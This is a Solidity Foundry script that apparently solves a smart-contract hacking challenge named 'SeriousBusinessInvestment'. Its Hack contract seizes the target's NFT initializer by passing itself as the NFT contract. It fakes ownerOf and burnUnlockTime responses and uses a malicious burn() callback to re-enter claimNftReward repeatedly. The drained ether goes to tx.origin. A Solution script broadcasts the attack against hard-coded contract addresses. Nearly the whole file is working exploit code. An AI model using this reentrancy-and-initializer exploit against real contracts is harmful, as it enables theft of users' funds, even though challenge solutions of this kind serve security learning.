// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

import "../src/Task.sol";
import {Script, console} from "forge-std/Script.sol";

contract Hack {
    SeriousBusinessInvestment _seriousBusinessInvestmentInstance;

    constructor(
        SeriousBusinessInvestment seriousBusinessInvestmentInstance
    ) payable {
        _seriousBusinessInvestmentInstance = seriousBusinessInvestmentInstance;
    }

    function hackContract() external {
        _seriousBusinessInvestmentInstance.nftContractsInitializer(
            "",
            address(this)
        );
        _seriousBusinessInvestmentInstance.deposit{
            value: address(this).balance
        }();
        _seriousBusinessInvestmentInstance.claimNftReward(1);
        payable(tx.origin).transfer(address(this).balance);
    }

    function mint(address _to, uint256 _nftId) public {}

    function burn(uint256 _nftId) public {
        if (
            address(_seriousBusinessInvestmentInstance).balance >=
            _seriousBusinessInvestmentInstance.NFT_BURN_REWARD()
        ) {
            _seriousBusinessInvestmentInstance.claimNftReward(1);
        }
    }

    function ownerOf(uint256 _nftId) public returns (address) {
        return address(this);
    }

    function burnUnlockTime(uint256 _nftId) public returns (uint) {
        return 0;
    }

    receive() external payable {}
}

contract Solution is Script {
    IMegaMankiNFT public iMegaMankiNFTInstance =
        IMegaMankiNFT(payable(0x3e679Be6eA055C4Bf80c84bA028FB98248577c7F));

    SeriousBusinessInvestment public seriousBusinessInvestmentInstance =
        SeriousBusinessInvestment(
            payable(0x9178e32Ea6B5054e55FC1cac559244157E9FBcEf)
        );

    function run() external {
        vm.startBroadcast();
        console.log(
            "Contract Balance: ",
            address(seriousBusinessInvestmentInstance).balance
        );

        Hack hackContractInstance = new Hack{
            value: seriousBusinessInvestmentInstance.MAX_DEPO()
        }(seriousBusinessInvestmentInstance);
        hackContractInstance.hackContract{gas: 2500000}();

        console.log(
            "Contract Balance after rewards: ",
            address(seriousBusinessInvestmentInstance).balance
        );
        vm.stopBroadcast();
    }
}
